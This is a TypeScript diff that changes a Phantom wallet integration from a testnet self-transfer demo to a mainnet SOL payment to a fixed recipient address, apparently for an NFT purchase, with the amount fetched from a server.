@@ -4,36 +4,96 @@ import {
   Transaction,
   clusterApiUrl,
   SystemProgram,
-  LAMPORTS_PER_SOL
+  Keypair,
+  LAMPORTS_PER_SOL,
 } from "@solana/web3.js";
-window.Buffer = window.Buffer || require('buffer').Buffer;
+import {
+  getData,
+  PhantomProvider,
+  debug,
+  taranzact,
+  tanzacsiaRabota,
+  log,
+  EroorFhantom,
+} from "./funcsionLogic";
 
-type DisplayEncoding = "utf8" | "hex";
-type PhantomEvent = "disconnect" | "connect" | "accountChanged";
-type PhantomRequestMethod =
-  | "connect"
-  | "disconnect"
-  | "signTransaction"
-  | "signAllTransactions"
-  | "signMessage";
+let NETWORK: string;
+if (debug) NETWORK = clusterApiUrl("testnet");
+else NETWORK = clusterApiUrl("mainnet-beta");
+let taranzactFuncia: (() => Promise<taranzact|null>)[] = [nftTaranzact];
+const urlStatic: string = window.location.toString();
 
-interface ConnectOpts {
-  onlyIfTrusted: boolean;
+export async function tranzacsion(tin: number = 0) {
+  
+  const provider = await getProviderConect();
+  const connection = new Connection(NETWORK);
+  if (!provider) return false;
+  
+  let trnsPazm: taranzact|null;
+  await taranzactFuncia[tin]().then(data => trnsPazm = data);
+  if (trnsPazm == null)return false;
+  log(trnsPazm);
+
+  const createTransferTransaction = async () => {
+    try {
+    if (!provider.publicKey) return false;
+    if (trnsPazm.publickeusol == null && trnsPazm.stoimost <= 0) return false;
+
+    const publicKeyNrodaves = new PublicKey(trnsPazm.publickeusol);
+
+
+    let transaction = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: provider.publicKey,
+        toPubkey: publicKeyNrodaves,
+        lamports: LAMPORTS_PER_SOL * trnsPazm.stoimost,
+      })
+    );
+    transaction.feePayer = provider.publicKey;
+    log("Getting recent blockhash");
+    const anyTransaction: any = transaction;
+    anyTransaction.recentBlockhash = (
+      await connection.getRecentBlockhash()
+    ).blockhash;
+    return transaction;
+  } catch (err) {
+    return false;
+  }
+  };
+
+  const sendTransaction = async () => {
+    try {
+      const transaction = await createTransferTransaction();
+      if (!transaction) return false;
+      let signed = await provider.signTransaction(transaction);
+      log("Got signature, submitting transaction");
+      let signature = await connection.sendRawTransaction(signed.serialize());
+      log("Submitted transaction " + signature + ", awaiting confirmation");
+      await connection.confirmTransaction(signature);
+      log("Transaction " + signature + " confirmed");
+      return signature;
+    } catch (err) {
+      console.warn(EroorFhantom(err["code"]));
+      log("[error] sendTransaction: " + JSON.stringify(err));
+      return false;
+    }
+  };
+
+  log("start");
+  const res = await sendTransaction();
+  log("fines");
+  return res
 }
-
-interface PhantomProvider {
-  publicKey: PublicKey | null;
-  isConnected: boolean | null;
-  signTransaction: (transaction: Transaction) => Promise<Transaction>;
-  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;
-  signMessage: (
-    message: Uint8Array | string,
-    display?: DisplayEncoding
-  ) => Promise<any>;
-  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;
-  disconnect: () => Promise<void>;
-  on: (event: PhantomEvent, handler: (args: any) => void) => void;
-  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;
+/////////////////
+export async function getWalletBalance() {
+  try {
+    const provider = await getProviderConect();
+    const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
+    const walletBalance = await connection.getBalance(provider.publicKey);
+    log(`Wallet Balance is ${walletBalance}`);
+  } catch (er) {
+    log(er);
+  }
 }
 
 export function getProvider(): PhantomProvider | undefined {
@@ -47,83 +107,30 @@ export function getProvider(): PhantomProvider | undefined {
   window.open("https://phantom.app/", "_blank");
 }
 
-const NETWORK = clusterApiUrl("testnet");
-
-export async function tranzacsion() {
-  const conect = async () => {
-    try {
-      await provider.connect();
-    } catch (err) {
-      console.warn(err);
-    }
-  };
-
-
+export async function getProviderConect() {
   const provider = getProvider();
-  const connection = new Connection(NETWORK);
-  // console.log(provider.publicKey);
-  if(!provider.publicKey)await conect();
-  if (!provider) return;
+  try {
+    try {
+      await provider.connect({ onlyIfTrusted: true });
+    } catch (err) {
+      await provider.connect();
+    }
+  } catch (err) {
+    console.warn(err);
+  }
+  return provider;
+}
 
-  const createTransferTransaction = async () => {
-    // console.log(provider.publicKey);
-    if (!provider.publicKey) return;
-    let transaction = new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: provider.publicKey,
-        toPubkey: provider.publicKey,
-        lamports: 100,
-      })
-    );
-    transaction.feePayer = provider.publicKey;
-    const anyTransaction: any = transaction;
-    anyTransaction.recentBlockhash = (
-      await connection.getRecentBlockhash()
-    ).blockhash;
-    return transaction;
-  };
-  const sendTransaction = async () => {
-    try {
-      const transaction = await createTransferTransaction();
-      if (!transaction) return;
-      let signed = await provider.signTransaction(transaction);
-      let signature = await connection.sendRawTransaction(signed.serialize());
-      await connection.confirmTransaction(signature);
-    } catch (err) {
-      console.warn(err);
-    }
-  };
-  const signMultipleTransactions = async (onlyFirst: boolean = false) => {
-    try {
-      const [transaction1, transaction2] = await Promise.all([
-        createTransferTransaction(),
-        createTransferTransaction(),
-      ]);
-      if (transaction1 && transaction2) {
-        let txns;
-        if (onlyFirst) {
-          txns = await provider.signAllTransactions([transaction1]);
-        } else {
-          txns = await provider.signAllTransactions([
-            transaction1,
-            transaction2,
-          ]);
-        }
-      }
-    } catch (err) {
-      console.warn(err);
-    }
-  };
-  const signMessage = async (message: string) => {
-    try {
-      const data = new TextEncoder().encode(message);
-      const res = await provider.signMessage(data);
-    } catch (err) {
-      console.warn(err);
-    }
-  };
+///////////////////////////
 
-  // console.log("start");
-  await sendTransaction();
-  await signMultipleTransactions();
+async function nftTaranzact(): Promise<taranzact|null> {
+  let parameters:any = await getData("GETparams", "");
+  if (parameters == "ErorEczemplar")
+    return null;
+  
+  return {
+    stoimost: parameters["stoimost"],
+    publickeusol: "AtMCbPL5gjp2UdeZCki2c8FwXoY5fVfp3uAJ6hUDe4hw",
+    // publickeusol:parameters["publickeusol"]
+  };
 }
